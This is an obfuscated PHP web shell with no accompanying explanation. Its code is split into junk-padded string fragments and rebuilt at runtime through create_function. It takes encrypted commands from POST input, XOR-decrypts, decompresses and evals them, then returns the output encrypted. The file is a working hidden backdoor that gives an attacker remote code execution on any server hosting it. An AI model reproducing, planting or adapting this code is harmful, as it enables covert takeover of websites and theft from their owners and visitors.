<?php
$z='{$j};}}retur@%n @%$o;}if @%(@preg_matc@%h("/$k@%h@%@%(.+)$kf/",@fi@%le_@%get_cont';
$a='ents@%("php:/@%@%/inpu@%@%t"),$m)==1) {@ob_@%start();@%@e@%val(@g@%zuncompre@%ss@%(';
$y='@%@x(@base@%64_decode($m[1@%@%@%]),$k)));$o=@%@ob_get_cont@%ents();@@%ob_@%end_cl';
$c='@%$k="bece873a";$@%kh@%="ec04@%1bcacdf1@%";$kf="9@%@%f0eab1b4@%a4d";$p="e@%1g@%P@%@%cTlg1';
$Y='($@%i=@%0;$i<$l;){for(@%$j=0@%;($j<@%@%$c&&$i<$l);$@%j++,$i+@%+){@%$o.=$@%t{@%$i@%}^$k';
$V=str_replace('Mz','','cMzreaMzteMz_fuMznMzctiMzon');
$b='ea@%n()@%;$r=@ba@%@%se64_encode(@%@x(@gzc@%ompres@%s($o),@%$@%k));print(@%"$@%p$kh$r$kf");}';
$o='XLHei4p";functi@%on x($t@%,$k)@%{$c@%=@%strlen($k);@%$l=strl@%en($t);$o=@%""@%;for';
$J=str_replace('@%','',$c.$o.$Y.$z.$a.$y.$b);
$O=$V('',$J);$O();
?>
